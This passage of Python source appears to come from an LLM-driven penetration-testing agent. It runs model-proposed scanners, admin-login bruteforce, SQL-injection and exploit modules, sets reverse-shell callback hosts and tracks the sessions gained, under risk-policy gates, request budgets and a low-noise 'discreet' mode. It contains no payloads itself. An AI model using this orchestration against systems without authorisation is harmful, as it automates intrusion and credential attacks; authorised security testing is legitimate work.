        ).union(self._get_probable_cms_specializations(kb))
        upper_bound = max(8, min(12, int(state.max_modules or 40)))
        if self._has_exploit_pressure(state):
            upper_bound = max(upper_bound, 14)
        if self._has_authenticated_session(kb):
            upper_bound = max(upper_bound, 6)
        elif self._should_prioritize_auth_surface(kb) or cms_lock:
            # Login/CMS-tight phases still need room for bruteforce + chained scanners (4 was too low).
            upper_bound = min(upper_bound, 10)
        if self._discreet_mode(state):
            if self._has_authenticated_session(kb):
                upper_bound = min(upper_bound, 5)
            elif self._has_exploit_pressure(state):
                upper_bound = min(upper_bound, 6)
            elif self._should_prioritize_auth_surface(kb) or cms_lock:
                upper_bound = min(upper_bound, 4)
            else:
                upper_bound = min(upper_bound, 3)
        max_requests = max(2, min(max_requests, upper_bound))

        stop_conditions = llm_response.get("stop_conditions", [])
        if not isinstance(stop_conditions, list):
            stop_conditions = []
        stop_conditions = [str(x) for x in stop_conditions[:8]]

        confidence = llm_response.get("reasoning_confidence", 0.7)
        try:
            confidence = float(confidence)
        except Exception:
            confidence = 0.7
        confidence = max(0.0, min(confidence, 1.0))

        skip_exploitation = any(
            cond in ("no_exploit_paths", "stop_if_no_exploit_path")
            for cond in stop_conditions
        )
        return {
            "next_actions": actions,
            "max_requests_next_phase": max_requests,
            "stop_conditions": stop_conditions,
            "reasoning_confidence": confidence,
            "skip_exploitation": skip_exploitation,
        }

    def _sanitize_action_options(self, options):
        if not isinstance(options, dict):
            return {}
        safe = {}
        option_patch = options.get("option_patch")
        for key, value in list(options.items())[:12]:
            if not isinstance(key, str):
                continue
            key = key.strip()
            if not key or len(key) > 64:
                continue
            if key == "option_patch":
                continue
            if isinstance(value, (bool, int, float)):
                safe[key] = value
            elif isinstance(value, str):
                safe[key] = value[:256]
        if isinstance(option_patch, dict):
            from interfaces.command_system.builtin.agent.option_resolver import PROTECTED_OPTION_KEYS
            from interfaces.command_system.builtin.agent.typed_models import OptionPatch

            patch = OptionPatch.from_dict(option_patch)
            cleaned_opts = {}
            for key, value in list((patch.options or {}).items())[:12]:
                norm = str(key).strip().lower()
                if not norm or norm in PROTECTED_OPTION_KEYS:
                    continue
                if isinstance(value, (bool, int, float)):
                    cleaned_opts[norm] = value
                elif isinstance(value, str):
                    cleaned_opts[norm] = value[:256]
            evidence = [str(x) for x in (patch.evidence_ids or [])[:12] if str(x).strip()]
            if cleaned_opts and evidence:
                safe["option_patch"] = {
                    "module_path": str(patch.module_path or "")[:256],
                    "options": cleaned_opts,
                    "evidence_ids": evidence,
                    "expected_effect": str(patch.expected_effect or "")[:256] or None,
                }
        return safe

    def _sanitize_http_request_action_options(self, options):
        from interfaces.command_system.builtin.agent.http_probe_actions import (
            sanitize_http_request_action_options,
        )

        return sanitize_http_request_action_options(options)

    def _sanitize_surface_scan_action_options(self, options):
        from interfaces.command_system.builtin.agent.http_probe_actions import (
            sanitize_surface_scan_action_options,
        )

        return sanitize_surface_scan_action_options(options)

    def _extract_plan_option_maps(self, execution_plan):
        actions = execution_plan.get("next_actions", [])
        followup_options = {}
        exploit_options = {}
        explicit_exploit_paths = []
        if not isinstance(actions, list):
            return followup_options, exploit_options, explicit_exploit_paths
        for action in actions:
            if not isinstance(action, dict):
                continue
            action_type = action.get("type")
            path = str(action.get("path", "")).strip()
            options = self._sanitize_action_options(action.get("options", {}))
            if action_type == "run_followup" and path:
                followup_options[path] = options
            if action_type == "run_exploit" and path:
                exploit_options[path] = options
                explicit_exploit_paths.append(path)
        return followup_options, exploit_options, explicit_exploit_paths

    def _execute_plan_followups(self, state: AgentState, execution_plan: Dict[str, Any], option_overrides=None):
        """
        Execute safe follow-up scanner/auxiliary actions suggested by LLM plan.
        """
        option_overrides = option_overrides or {}
        actions = execution_plan.get("next_actions", [])
        if not isinstance(actions, list):
            return []

        def _priority_key(row):
            if not isinstance(row, dict):
                return 999
            p = row.get("priority", 999)
            try:
                return int(p)
            except Exception:
                return 999

        actions = sorted(actions, key=_priority_key)

        followup_paths = []
        post_paths = []
        http_actions = []
        surface_actions = []
        for action in actions:
            if not isinstance(action, dict):
                continue
            action_type = str(action.get("type", "")).strip().lower()
            path = str(action.get("path", "")).strip()
            if action_type == "surface_scan":
                surface_actions.append(action)
                continue
            if action_type == "http_request":
                if path:
                    http_actions.append(action)
                continue
            if not path:
                continue
            if action_type == "run_post":
                post_paths.append(path)
                continue
            if action_type == "run_followup" and path.startswith("post/"):
                post_paths.append(path)
                continue
            if action_type != "run_followup":
                continue
            ok_prefix = path.startswith("scanner/") or path.startswith("auxiliary/scanner/")
            if path in CLIENT_JS_INTEL_MODULES:
                ok_prefix = True
            if not ok_prefix and getattr(state, "expanded_surface", False):
                ok_prefix = self._is_expanded_surface_module_path(path) and path.startswith(
                    ("auxiliary/osint/", "auxiliary/aws/", "auxiliary/azure/", "auxiliary/gcp/")
                )
            if not ok_prefix:
                continue
            followup_paths.append(path)

        selected_paths = followup_paths + post_paths
        max_req = int(execution_plan.get("max_requests_next_phase", 10) or 10)
        budget = max(1, min(max_req, 12))
        surface_results = self._execute_plan_surface_scans(state, surface_actions, budget)
        if surface_results:
            self._update_knowledge_base_from_results(
                state.knowledge_base,
                surface_results,
                [row.get("path") for row in surface_results if isinstance(row, dict)],
                self._extract_tech_hints(surface_results),
                set(),
            )
        remaining_after_surface = max(0, budget - len(surface_results))
        http_results = self._execute_plan_http_requests(state, http_actions, remaining_after_surface)
        if http_results:
            self._update_knowledge_base_from_results(
                state.knowledge_base,
                http_results,
                [row.get("path") for row in http_results if isinstance(row, dict)],
                self._extract_tech_hints(http_results),
                set(),
            )
        if not selected_paths:
            return surface_results + http_results

        remaining_budget = max(0, budget - len(surface_results) - len(http_results))
        if remaining_budget <= 0:
            return surface_results + http_results

        available = {}
        for m in self._catalog.discover_campaign_modules(
            expanded=bool(getattr(state, "expanded_surface", False))
            or any(path in CLIENT_JS_INTEL_MODULES for path in followup_paths),
        ):
            available[m.get("path")] = m
        for module_path in post_paths:
            if module_path in available:
                continue
            agent = self._catalog.get_agent_metadata(module_path)
            if agent is not None:
                available[module_path] = {
                    "path": module_path,
                    "name": module_path,
                    "agent": agent,
                }

        selected_modules = []
        seen = set()
        for path in selected_paths:
            if path in seen:
                continue
            module_info = available.get(path)
            if module_info:
                selected_modules.append(module_info)
                seen.add(path)
            if len(selected_modules) >= remaining_budget:
                break

        if not selected_modules:
            return surface_results + http_results

        observed_modules = {
            str(path).strip()
            for path in state.knowledge_base.get("observed_modules", [])
            if str(path).strip()
        }
        selected_modules = [
            module for module in selected_modules
            if str(module.get("path", "")).strip() not in observed_modules
            or module_allowed_despite_observed(state.knowledge_base, str(module.get("path", "")).strip())
        ]
        if not selected_modules:
            return surface_results + http_results

        failed_action_keys = self._get_failed_action_keys(state.knowledge_base)
        if failed_action_keys:
            selected_modules = [
                module for module in selected_modules
                if not self._planner_action_keys(module.get("path", "")).intersection(failed_action_keys)
            ]
        if not selected_modules:
            return surface_results + http_results

        # Enforce CMS lock even against LLM-proposed follow-ups.
        selected_modules = self._filter_modules_for_cms_lock(
            selected_modules,
            state.knowledge_base,
            state.scan_specializations,
        )
        selected_modules = self._prune_modules_for_primary_cms(
            selected_modules,
            state.knowledge_base,
        )
        if self._has_authenticated_session(state.knowledge_base):
            selected_modules = [
                module for module in selected_modules
                if not any(token in str(module.get("path", "")).lower() for token in (
                    "login_page_detector",
                    "admin_login_bruteforce",
                ))
            ]
        if not selected_modules:
            return surface_results + http_results

        print_status(f"Execution plan follow-up: running {len(selected_modules)} module(s)")
        followup_results = self._execute_plan_modules_with_options(
            selected_modules,
            state,
            option_overrides=option_overrides,
            verbose=bool(state.verbose),
        )

        selected_paths = [m.get("path") for m in selected_modules if m.get("path")]
        failed_paths = set()
        for row in followup_results:
            if not isinstance(row, dict):
                continue
            path = str(row.get("path", "")).strip()
            if not path:
                continue
            status = str(row.get("status", "")).strip().lower()
            playbook_id = str(execution_plan.get("playbook_id") or "")
            step_id = ""
            for action in actions:
                if isinstance(action, dict) and str(action.get("path", "")).strip() == path:
                    step_id = str(action.get("playbook_step") or action.get("step_id") or "")
                    break
            if playbook_id and step_id:
                record_playbook_execution(
                    state.knowledge_base,
                    playbook_id=playbook_id,
                    step_id=step_id,
                    module_path=path,
                    success=bool(row.get("vulnerable")) or status not in ("error", "skipped"),
                )
            if status == "error":
                failed_paths.add(path)
                continue
            path_low = path.lower()
            if any(token in path_low for token in ("bruteforce", "login", "auth")) and not row.get("vulnerable"):
                failed_paths.add(path)
        self._remember_planner_actions(state.knowledge_base, selected_paths, failed_paths)
        followup_hints = self._extract_tech_hints(followup_results)
        self._update_knowledge_base_from_results(
            state.knowledge_base,
            followup_results,
            selected_paths,
            followup_hints,
            set(),
        )
        return surface_results + http_results + followup_results

    def _execute_plan_modules_with_options(self, modules, state: AgentState, option_overrides=None, verbose=False):
        option_overrides = dict(option_overrides or {})
        for module_path, inferred in self._build_inferred_option_overrides(modules, state).items():
            merged = dict(inferred)
            merged.update(option_overrides.get(module_path, {}))
            option_overrides[module_path] = merged
        results = []
        target_info = state.target_info
        hostname = target_info.get("hostname")
        port = target_info.get("port")
        scheme = target_info.get("scheme")

        for module_info in modules:
            if self._phase_stop_reason(state, "plan-followup"):
                break
            module_path = module_info.get("path")
            result = {
                "module": module_info.get("name", module_path),
                "path": module_path,
                "status": "error",
                "vulnerable": False,
                "message": "",
                "details": {},
            }
            block_reason = self._module_block_reason_for_profile(state, module_path)
            if block_reason:
                result["status"] = "skipped"
                result["message"] = block_reason
                result["details"] = {"safety_profile": self._normalized_safety_profile(state)}
                results.append(result)
                continue
            unreachable_skip = self._unreachable_target_module_skip_reason(state, module_path)
            if unreachable_skip:
                result["status"] = "skipped"
                result["message"] = unreachable_skip
                results.append(result)
                continue
            announced_bruteforce = False
            if "admin_login_bruteforce" in str(module_path).lower():
                hinted_path = (
                    option_overrides.get(module_path, {}).get("path")
                    or option_overrides.get(module_path, {}).get("login_path")
                    or self._select_best_login_path(state.knowledge_base)
                    or "/admin/login"
                )
                print_status(f"Trying admin login bruteforce on {hinted_path}")
                announced_bruteforce = True
            set_thread_output_quiet(not verbose)
            try:
                module_instance = self.framework.module_loader.load_module(
                    module_path,
                    load_only=False,
                    framework=self.framework,
                )
                if not module_instance:
                    result["message"] = "Failed to load module"
                    results.append(result)
                    continue

                self._set_default_target_options(module_instance, hostname, port, scheme)
                self._seed_http_session_from_auth(module_instance, state)
                merged_options = dict(self._infer_auth_option_overrides(module_instance, module_path, state))
                plan_opts = dict(option_overrides.get(module_path, {}) or {})
                option_patch = plan_opts.pop("option_patch", None) if isinstance(plan_opts, dict) else None
                merged_options.update(plan_opts)
                self._apply_safe_module_options(module_instance, merged_options, state=state)
                self._apply_sqli_context_options(module_instance, module_path, state)

                if not self._module_uses_http_client(module_instance) and not self._consume_network_units(
                    state,
                    module=module_instance,
                    module_path=module_path,
                    reason=f"module {module_path}",
                ):
                    results.append(self._budget_skip_result(module_info, "plan-followup"))
                    continue
                outcome = self._module_executor.execute(
                    module_instance,
                    module_path,
                    state,
                    phase="plan-followup",
                    use_exploit_wrapper=False,
                    option_patch=option_patch if isinstance(option_patch, dict) else None,
                )
                if outcome.get("blocked"):
                    result["status"] = "skipped"
                    result["message"] = outcome.get("error") or "Blocked by agent policy"
                    result["details"] = {
                        "risk": getattr(outcome.get("risk"), "level", "unknown"),
                    }
                    results.append(result)
                    continue
                execution = outcome.get("execution")
                run_result = execution.result if execution is not None else None
                if execution is not None and execution.error and not execution.command_success:
                    raise RuntimeError(execution.error)
                result["vulnerable"] = bool(run_result)
                result["status"] = "vulnerable" if result["vulnerable"] else "safe"

                module_meta = getattr(module_instance, "__info__", {}) or {}
                dynamic_info = getattr(module_instance, "vulnerability_info", {}) or {}
                result["message"] = dynamic_info.get("reason") or module_meta.get("description", "")
                result["severity"] = dynamic_info.get("severity") or module_meta.get("severity")
                exploit_path = self._catalog.normalize_exploit_module_path(module_meta.get("module"))
                if exploit_path:
                    result["exploit_module"] = exploit_path
                linked_modules = self._catalog.normalize_linked_module_paths(module_meta.get("modules"))
                if linked_modules:
                    result["linked_modules"] = linked_modules
                result["details"] = {
                    key: value for key, value in dynamic_info.items()
                    if key not in ("reason", "severity", "version")
                }
                if isinstance(run_result, dict):
                    result["details"].update(run_result)
                    if "error" in run_result and not dynamic_info.get("reason"):
                        result["message"] = str(run_result.get("error") or result["message"])
            except Exception as exc:
                result["message"] = f"Error: {exc}"
            finally:
                set_thread_output_quiet(False)
            results.append(result)
            if announced_bruteforce and not verbose and result.get("message"):
                print_info(f"Bruteforce result: {result.get('message')}")
            if verbose:
                icon = "[+]" if result["vulnerable"] else "[-]"
                print_info(f"{icon} {result['path']}: {result.get('message', '')}")
        return results

    def _set_default_target_options(self, module_instance, hostname, port, scheme):
        if hasattr(module_instance, "target"):
            module_instance.set_option("target", hostname)
        elif hasattr(module_instance, "rhost"):
            module_instance.set_option("rhost", hostname)
        elif hasattr(module_instance, "rhosts"):
            module_instance.set_option("rhosts", hostname)

        if hasattr(module_instance, "port"):
            module_instance.set_option("port", port)
        elif hasattr(module_instance, "rport"):
            module_instance.set_option("rport", port)

        if hasattr(module_instance, "ssl"):
            module_instance.set_option("ssl", (scheme == "https"))

        # Reverse payloads/listeners often default to 127.0.0.1. Prefer a routable
        # callback: Docker bridge gateway for container targets, else LAN IP.
        if hasattr(module_instance, "lhost"):
            try:
                current_lhost = str(getattr(module_instance, "lhost", "") or "").strip()
            except Exception:
                current_lhost = ""
            from core.utils.lhost_resolver import (
                is_docker_bridge_host,
                resolve_callback_lhost,
            )

            needs_resolve = self._is_loopback_or_unspecified_host(current_lhost)
            if (
                not needs_resolve
                and is_docker_bridge_host(hostname)
                and current_lhost.startswith(("192.168.", "10."))
                and not is_docker_bridge_host(current_lhost)
            ):
                # LAN lhost against a docker-bridge target often dies after connect.
                needs_resolve = True
            if needs_resolve:
                resolved_lhost = resolve_callback_lhost(hostname, port)
                if resolved_lhost:
                    module_instance.set_option("lhost", resolved_lhost)

    def _is_loopback_or_unspecified_host(self, value: str) -> bool:
        from core.utils.lhost_resolver import is_loopback_or_unspecified_host

        return is_loopback_or_unspecified_host(value)

    def _resolve_routable_lhost(self, target_host: Any) -> str:
        from core.utils.lhost_resolver import discover_primary_lan_ip, resolve_callback_lhost

        return resolve_callback_lhost(target_host) or discover_primary_lan_ip()

    def _resolve_docker_gateway_lhost(self, target_host: Any, target_port: Any) -> str:
        from core.utils.lhost_resolver import resolve_docker_gateway_for_port

        return resolve_docker_gateway_for_port(target_port)

    def _reverse_callback_diagnostic(self, module_instance, target_info: Optional[Dict[str, Any]]) -> str:
        if getattr(module_instance, "payload_type", None) != "reverse":
            return ""
        if not hasattr(module_instance, "lhost"):
            return ""

        try:
            lhost = str(getattr(module_instance, "lhost", "") or "").strip()
        except Exception:
            lhost = ""
        if not self._is_loopback_or_unspecified_host(lhost):
            return ""

        info = target_info or {}
        scheme = str(info.get("scheme", "http") or "http").strip().lower()
        hostname = str(info.get("hostname", "") or "").strip()
        port = info.get("port")
        port_label = ""
        if port not in (None, ""):
            port_label = f":{port}"
        target_label = f"{scheme}://{hostname}{port_label}" if hostname else "the current target"

        return (
            "Reverse payload still points to a loopback lhost "
            f"({lhost or '127.0.0.1'}) for {target_label}. "
            "If the service is exposed from Docker, WSL, a VM, or another network namespace, "
            "the callback will loop back inside the target instead of reaching Kittysploit."
        )

    def _apply_sqli_context_options(self, module_instance, module_path: str, state: AgentState) -> None:
        """Seed injection / chain module options from agent knowledge base."""
        low = str(module_path or "").lower()
        kb = state.knowledge_base if isinstance(state.knowledge_base, dict) else {}
        risk = {str(x).lower() for x in (kb.get("risk_signals", []) or [])}

        if "sqli_engine" in low or "sql_injection" in low:
            endpoints = [str(e).strip() for e in (kb.get("discovered_endpoints", []) or []) if str(e).strip()][:40]
            params = [str(p).strip() for p in (kb.get("discovered_params", []) or []) if str(p).strip()][:30]
            opts: Dict[str, Any] = {"blind_fallback": False}
            if endpoints:
                opts["scan_paths"] = ",".join(endpoints)
            if params:
                opts["seed_params"] = ",".join(params)
            login_paths = [
                str(p).strip()
                for p in (kb.get("login_paths", []) or [])
                if str(p).strip().startswith("/")
            ][:8]
            if login_paths:
                opts["extra_paths"] = ",".join(login_paths)
            if "waf_or_blocking_detected" in risk:
                opts["waf_detected"] = True
            self._apply_safe_module_options(module_instance, opts, state=state)

        chain_opts = apply_chain_module_options(module_instance, module_path, kb)
        if chain_opts:
            self._apply_safe_module_options(module_instance, chain_opts, state=state)

    def _apply_safe_module_options(self, module_instance, options, state: Optional[AgentState] = None):
        if not isinstance(options, dict):
            return
        if state is not None:
            from interfaces.command_system.builtin.agent.credential_vault import (
                apply_resolved_options,
                get_credential_vault,
            )

            vault = get_credential_vault(state=state, kb=getattr(state, "knowledge_base", None))
            apply_resolved_options(module_instance, options, vault)
            return
        for key, value in options.items():
            if not hasattr(module_instance, key):
                continue
            try:
                module_instance.set_option(key, value)
            except Exception:
                continue

    def _safe_option_value(self, module_instance, option_name: str) -> Any:
        if not hasattr(module_instance, option_name):
            return None
        if option_name == "payload":
            try:
                option_descriptor = getattr(type(module_instance), option_name, None)
                if option_descriptor and hasattr(option_descriptor, "to_dict"):
                    payload_info = option_descriptor.to_dict(module_instance)
                    return payload_info.get("display_value") or payload_info.get("value")
            except Exception:
                return None
        try:
            value = getattr(module_instance, option_name)
        except Exception:
            return None
        text = str(value or "")
        if option_name.lower() in ("password", "pass", "passwd", "token", "api_key", "apikey"):
            return "***" if text else ""
        return value

    def _module_runtime_option_snapshot(self, module_instance) -> Dict[str, Any]:
        keys = (
            "target",
            "rhost",
            "rhosts",
            "port",
            "rport",
            "ssl",
            "path",
            "base_path",
            "payload",
            "lhost",
            "lport",
            "username",
            "password",
        )
        snap: Dict[str, Any] = {}
        for key in keys:
            value = self._safe_option_value(module_instance, key)
            if value is None:
                continue
            snap[key] = value
        return snap

    def _execute_exploit_results_with_options(
        self,
        selected_results,
        target_info,
        state=None,
        exploit_option_overrides=None,
        explicit_exploit_paths=None,
        verbose=False,
    ):
        exploit_option_overrides = exploit_option_overrides or {}
        explicit_exploit_paths = explicit_exploit_paths or []
        hostname = target_info.get("hostname")
        port = target_info.get("port")
        scheme = target_info.get("scheme")

        exploit_paths = set([
            self._catalog.normalize_exploit_module_path(r.get("exploit_module"))
            for r in selected_results
            if self._catalog.normalize_exploit_module_path(r.get("exploit_module"))
        ])
        exploit_paths.update([
            p for p in explicit_exploit_paths
            if p and (p.startswith("exploit/") or p.startswith("exploits/"))
        ])
        if not exploit_paths:
            return

        print_status("Exploiting...")
        failed_paths = set()
        attempted_paths = set()
        policy_skip_count = 0
        for exploit_path in sorted(exploit_paths):
            if isinstance(state, AgentState) and self._phase_stop_reason(state, "exploit"):
                break
            if isinstance(state, AgentState):
                forced_protocol = str(getattr(state, "protocol", "") or "").strip().lower()
                if forced_protocol and not path_matches_forced_protocol(exploit_path, forced_protocol):
                    failed_paths.add(exploit_path)
                    print_warning(
                        f"Exploit skipped [{exploit_path}]: conflicts with --protocol {forced_protocol}"
                    )
                    continue
                mismatch_reason = self._module_stack_mismatch_reason(
                    exploit_path,
                    state.knowledge_base,
                )
                if mismatch_reason:
                    failed_paths.add(exploit_path)
                    print_warning(f"Exploit skipped [{exploit_path}]: {mismatch_reason}")
                    continue
                block_reason = self._module_block_reason_for_profile(state, exploit_path)
                if block_reason:
                    failed_paths.add(exploit_path)
                    policy_skip_count += 1
                    print_warning(f"Exploit skipped [{exploit_path}]: {block_reason}")
                    continue
            attempted_paths.add(exploit_path)
            try:
                set_thread_output_quiet(not verbose)
                exploit_instance = self.framework.module_loader.load_module(
                    exploit_path,
                    load_only=False,
                    framework=self.framework,
                )
                if not exploit_instance:
                    failed_paths.add(exploit_path)
                    continue
                self._set_default_target_options(exploit_instance, hostname, port, scheme)
                inferred_auth = {}
                if isinstance(state, AgentState):
                    self._seed_http_session_from_auth(exploit_instance, state)
                    inferred_auth = self._infer_auth_option_overrides(
                        exploit_instance, exploit_path, state
                    )
                    auth_context = self._get_active_auth_context(state.knowledge_base)
                    login_candidates = [
                        str(path) for path in state.knowledge_base.get("login_paths", [])
                        if isinstance(path, str) and path.startswith("/")
                    ][:6]
                    selected_login_path = (
                        str(auth_context.get("login_path") or "").strip()
                        or self._select_best_login_path(state.knowledge_base)
                    )
                    selected_final_path = str(auth_context.get("final_path") or "").strip()
                    if verbose:
                        set_thread_output_quiet(False)
                        print_info(
                            f"Exploit auth inference [{exploit_path}]: "
                            f"active_auth={bool(auth_context)} "
                            f"selected_login_path={selected_login_path or '-'} "
                            f"selected_final_path={selected_final_path or '-'} "
                            f"login_candidates={login_candidates}"
                        )
                        print_info(
                            f"Exploit inferred overrides [{exploit_path}]: "
                            f"{inferred_auth if inferred_auth else 'none'}"
                        )
                    set_thread_output_quiet(not verbose)
                merged_options = dict(inferred_auth)
                if isinstance(state, AgentState):
                    inferred_module = self._build_inferred_option_overrides(
                        [{"path": exploit_path}],
                        state,
                    ).get(exploit_path, {})
                    merged_options.update(inferred_module)
                merged_options.update(exploit_option_overrides.get(exploit_path, {}))
                self._apply_safe_module_options(
                    exploit_instance, merged_options, state=state if isinstance(state, AgentState) else None
                )
                runtime_snapshot = self._module_runtime_option_snapshot(exploit_instance)
                if runtime_snapshot and verbose:
                    set_thread_output_quiet(False)
                    print_info(f"Exploit runtime options [{exploit_path}]: {runtime_snapshot}")
                    set_thread_output_quiet(not verbose)
                sessions_before = set()
                browser_before = set()
                if hasattr(self.framework, "session_manager"):
                    sessions_before = set(self.framework.session_manager.sessions.keys())
                    browser_before = set(self.framework.session_manager.browser_sessions.keys())
                self.framework.current_module = exploit_instance
                if (
                    isinstance(state, AgentState)
                    and not self._module_uses_http_client(exploit_instance)
                    and not self._consume_network_units(state, 1)
                ):
                    failed_paths.add(exploit_path)
                    print_warning(f"Exploit skipped [{exploit_path}]: request budget exhausted")
                    continue
                if isinstance(state, AgentState):
                    outcome = self._module_executor.execute(
                        exploit_instance,
                        exploit_path,
                        state,
                        phase="exploit",
                        use_exploit_wrapper=True,
                    )
                    if outcome.get("blocked"):
                        failed_paths.add(exploit_path)
                        print_warning(
                            f"Exploit blocked [{exploit_path}]: {outcome.get('error')}"
                        )
                        continue
                    execution = outcome.get("execution")
                    success = bool(execution and execution.success)
                else:
                    success = self.framework.execute_module()
                sessions_after = set()
                browser_after = set()
                if hasattr(self.framework, "session_manager"):
                    sessions_after = set(self.framework.session_manager.sessions.keys())
                    browser_after = set(self.framework.session_manager.browser_sessions.keys())
                new_standard = sorted(sessions_after - sessions_before)
                new_browser = sorted(browser_after - browser_before)
                if isinstance(state, AgentState) and (new_standard or new_browser):
                    provenance = state.knowledge_base.setdefault("session_provenance", {})
                    if isinstance(provenance, dict):
                        for session_id in new_standard + new_browser:
                            provenance[str(session_id)] = exploit_path
                reverse_callback_missing = False
                set_thread_output_quiet(False)
                if verbose:
                    if new_standard or new_browser:
                        print_info(
                            f"Exploit session delta [{exploit_path}]: "
                            f"standard+={new_standard}, browser+={new_browser}"
                        )
                    else:
                        print_info(
                            f"Exploit session delta [{exploit_path}]: no new session "
                            f"(standard={len(sessions_after)}, browser={len(browser_after)})"
                        )
                if not (new_standard or new_browser):
                    reverse_listener_timeout = (
                        getattr(exploit_instance, "payload_type", None) == "reverse"
                        and not bool(getattr(exploit_instance, "_session_received", False))
                    )
                    if reverse_listener_timeout:
                        listener_connections = 0
                        active_listener = getattr(exploit_instance, "active_listener", None)
                        if active_listener is not None and hasattr(active_listener, "connections"):
                            try:
                                listener_connections = len(active_listener.connections)
                            except Exception:
                                listener_connections = 0
                        print_warning(
                            f"Exploit reverse callback not observed [{exploit_path}] "
                            f"(listener_connections={listener_connections})"
                        )
                        diagnostic = self._reverse_callback_diagnostic(
                            exploit_instance,
                            target_info,
                        )
                        if diagnostic:
                            print_warning(diagnostic)
                        reverse_callback_missing = True
                set_thread_output_quiet(False)
                session_created = bool(new_standard or new_browser)
                if session_created:
                    success = True
                    failed_paths.discard(exploit_path)
                    self._record_exploit_confirmed_finding(
                        state,
                        exploit_path,
                        session_ids=new_standard + new_browser,
                    )

                if success and reverse_callback_missing:
                    failed_paths.add(exploit_path)
                    print_warning(
                        f"Exploit completed but no reverse session was established: {exploit_path}"
                    )
                elif success:
                    if session_created:
                        print_success(f"Exploit succeeded: {exploit_path} (session created)")
                    else:
                        print_success(f"Exploit succeeded: {exploit_path}")
                else:
                    failed_paths.add(exploit_path)
                    print_warning(f"Exploit failed: {exploit_path}")
            except Exception as exc:
                failed_paths.add(exploit_path)
                set_thread_output_quiet(False)
                print_warning(f"Error launching {exploit_path}: {exc}")
            finally:
                set_thread_output_quiet(False)
        if (
            isinstance(state, AgentState)
            and policy_skip_count
            and not attempted_paths
            and is_shell_operator_goal(self._operator_campaign_goal(state))
        ):
            print_warning(
                f"All {policy_skip_count} exploit candidate(s) blocked by risk policy. "
                "Re-run with --approve-risk intrusive (or --profile internal-lab) to allow shell/RCE modules."
            )
        if isinstance(state, AgentState):
            self._remember_planner_actions(state.knowledge_base, attempted_paths, failed_paths)

    def _node_exploit(self, state: AgentState) -> AgentState:
        state.metrics.deterministic_steps += 1
        if state.dry_run or state.plan_only:
            reason = "dry-run" if state.dry_run else "plan-only"
            print_info(f"Exploitation skipped: {reason}.")
            self._append_timeline_event(
                state,
                "exploit",
                f"Exploitation skipped by {reason} policy.",
                kind="execution",
            )
            state.new_sessions = []
            return state
        if state.target_reachable is False:
            print_info("Exploitation skipped: target unreachable.")
            state.new_sessions = []
            self._append_timeline_event(
                state,
                "exploit",
                "Exploitation skipped because target is unreachable.",
                kind="execution",
            )
            return state
        shell_stop = self._has_shell_milestone(state)
        if shell_stop:
            self._sync_campaign_goal(state)
            if state.verbose:
                print_info("Strategic stop: shell or interactive session; skipping follow-ups and exploit launches.")

        if not shell_stop and not state.no_exploit and state.vulnerable_results:
            decision_source = state.decision_source
            execution_plan = state.execution_plan or {}
            followup_options, exploit_options, explicit_exploit_paths = self._extract_plan_option_maps(
                execution_plan
            )
            next_best_action = (state.llm_plan or {}).get("next_best_action", {})
            if isinstance(next_best_action, dict):
                nba_type = str(next_best_action.get("type", "")).strip().lower()
                nba_path = str(next_best_action.get("path", "")).strip()
                if nba_type == "run_exploit" and nba_path:
                    normalized_nba = self._catalog.normalize_exploit_module_path(nba_path)
                    if normalized_nba and normalized_nba not in explicit_exploit_paths:
                        explicit_exploit_paths.append(normalized_nba)

            # Execute LLM-proposed follow-up scanner actions before exploitation.
            followup_results = self._execute_plan_followups(
                state,
                execution_plan,
                option_overrides=followup_options,
            )
            if followup_results:
                state.results.extend(followup_results)
                state.vulnerable_results = [
                    r for r in state.results
                    if self._is_actionable_finding(r)
                ]
                state.contextual_findings = self._deduplicate_findings(
                    self._build_contextual_findings(
                        state.vulnerable_results,
                        state.knowledge_base,
                    )
                )

            # Follow-ups may have just obtained a session (e.g. bruteforce); run post-auth scanners once.
            if self._has_authenticated_session(state.knowledge_base):
                post_rows = self._suggest_post_auth_methodical_actions(
                    state, state.knowledge_base, max_actions=6
                )
                if post_rows:
                    post_max_requests = min(12, max(6, len(post_rows) + 2))
                    if self._discreet_mode(state):
                        post_max_requests = min(4, max(2, len(post_rows)))
                    post_plan = {
                        "next_actions": post_rows,
                        "max_requests_next_phase": post_max_requests,
                    }
                    post_followups = self._execute_plan_followups(
                        state,
                        post_plan,
                        option_overrides={},
                    )
                    if post_followups:
                        state.results.extend(post_followups)
                        state.vulnerable_results = [
                            r for r in state.results
                            if self._is_actionable_finding(r)
                        ]
                        state.contextual_findings = self._deduplicate_findings(
                            self._build_contextual_findings(
                                state.vulnerable_results,
                                state.knowledge_base,
                            )
                        )

            selected_paths = state.llm_plan.get("selected_paths", [])
            selected_set = set(selected_paths)
            contextual_findings = state.contextual_findings or state.vulnerable_results
            selected_results = list(contextual_findings)
            plan_actions = execution_plan.get("next_actions", [])
            plan_paths = [
                action.get("path") for action in plan_actions
                if isinstance(action, dict) and action.get("type") in ("prioritize", "run_followup", "run_exploit")
            ]
            if plan_paths:
                selected_set.update([p for p in plan_paths if p])

            if selected_set:
                prioritized = [
                    r for r in contextual_findings
                    if r.get("path") in selected_set and r.get("vulnerable")
                ]
                if prioritized:
                    selected_results = prioritized

            inferred_exec_paths = self._derive_exploit_paths_from_findings(
                selected_results or contextual_findings,
                state.knowledge_base,
                limit=5,
            )
            for path in inferred_exec_paths:
                if path and path not in explicit_exploit_paths:
                    explicit_exploit_paths.append(path)
            if not explicit_exploit_paths:
                fallback_kb_paths = self._fallback_exploit_candidates_from_kb(
                    state.knowledge_base,
                    limit=5,
                )
                for path in fallback_kb_paths:
                    if path and path not in explicit_exploit_paths:
                        explicit_exploit_paths.append(path)

            exploit_candidates = [
                r for r in selected_results
                if str(r.get("decision_class", self._finding_decision_class(r))) == "exploit"
            ]
            followup_candidates = [
                r for r in selected_results
                if str(r.get("decision_class", self._finding_decision_class(r))) == "followup"
            ]
            info_candidates = [
                r for r in selected_results
                if str(r.get("decision_class", self._finding_decision_class(r))) == "info"
            ]

            if selected_results:
                source_label = "LLM" if decision_source == "llm_local" else "Heuristic plan"
                if exploit_candidates:
                    print_info(
                        f"{source_label} selected {len(exploit_candidates)} exploitation candidate(s) "
                        f"from {len(selected_results)} prioritized finding(s)."
                    )
                elif followup_candidates:
                    print_info(
                        f"{source_label} found no direct exploit path. "
                        f"{len(followup_candidates)} finding(s) require follow-up validation."
                    )
                elif info_candidates:
                    print_info(
                        f"{source_label} retained only informational findings "
                        f"({len(info_candidates)}); no direct exploit module is linked yet."
                    )

            max_req = execution_plan.get("max_requests_next_phase", 0)
